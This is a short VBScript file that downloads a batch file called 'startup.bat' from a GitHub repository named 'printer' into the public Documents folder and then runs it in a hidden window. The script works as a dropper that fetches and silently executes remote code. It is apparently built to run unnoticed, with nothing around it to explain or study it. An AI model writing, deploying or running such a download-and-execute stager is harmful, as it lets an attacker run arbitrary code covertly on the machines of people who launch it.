Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run "curl -0 ""https://raw.githubusercontent.com/R911-bot/printer/main/startup.bat"" -o ""C:\Users\Public\Documents\startup.bat"" "
WshShell.Run chr(34) & "C:\Users\Public\Documents\startup.bat" & chr(34), 0 
Set WshShell = Nothing 
